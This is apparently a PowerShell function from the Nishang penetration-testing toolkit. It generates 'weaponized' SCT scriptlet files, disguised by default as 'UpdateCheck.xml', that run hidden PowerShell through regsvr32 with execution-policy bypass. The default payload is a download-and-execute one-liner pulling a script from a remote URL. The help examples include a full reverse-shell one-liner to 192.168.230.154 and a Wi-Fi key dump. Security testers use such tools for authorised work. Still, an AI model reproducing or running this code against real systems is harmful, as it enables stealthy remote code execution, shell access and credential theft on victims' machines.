function Out-SCT
{
<#
.SYNOPSIS
Nishang script useful for creating "weaponized" SCT files which could be used to run PowerShell commands and scripts.

.DESCRIPTION
The script generates a SCT file with an XML extension. The file (default name UpdateCheck.xml) needs to be 
hosted on a web server and using regsvr32 built-in executable it could be executed on a target with minimal traces. 

The extension of the generated file doesn't matter and any extension can be used.

The script is based on the work by Casey Smith (@subTee)

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the PowerShell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the PowerShell script to be executed on the target.

.PARAMETER OutputPath
Path to the directory where the files would be saved. Default is the current directory.

.EXAMPLE
PS > Out-SCT -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"

Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
named "UpdateCheck.xml" would be generated in the current directory.


PS > Out-SCT -PayloadURL http://192.168.230.1/Powerpreter.psm1 -Arguments "Get-Information;Get-Wlan-Keys"

Use above command for multiple payloads.


PS > Out-SCT -Payload "`$sm=(New-Object Net.Sockets.TCPClient('192.168.230.154',443)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '> ';`$sb=([text.encoding]::ASCII).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}"

Use above for a Reverse PowerShell Session. Note that there is no need of download-execute in this case.


.LINK
http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
https://github.com/samratashok/nishang
#> 

    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,
        
        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\UpdateCheck.xml"
    )

    #Check if the payload has been provided by the user
    if(!$Payload)
    {
        $Payload = "powershell IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
    }  
    #Below code comes from https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
    $cmd = @"
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="WinCheck"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

    <script language="JScript">
		<![CDATA[
           	ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
            c = "$Payload";
            r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
		]]>
	</script>
    </registration>
</scriptlet>
"@

    Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
    Write-Output "Weaponized SCT file written to $OutputPath"

    Write-Output "Host $OutputPath on a web server."
    Write-Output "Run the following command on the target:"
    Write-Output "regsvr32.exe /u /n /s /i:[WebServerURL]/UpdateCheck.xml scrobj.dll"
}

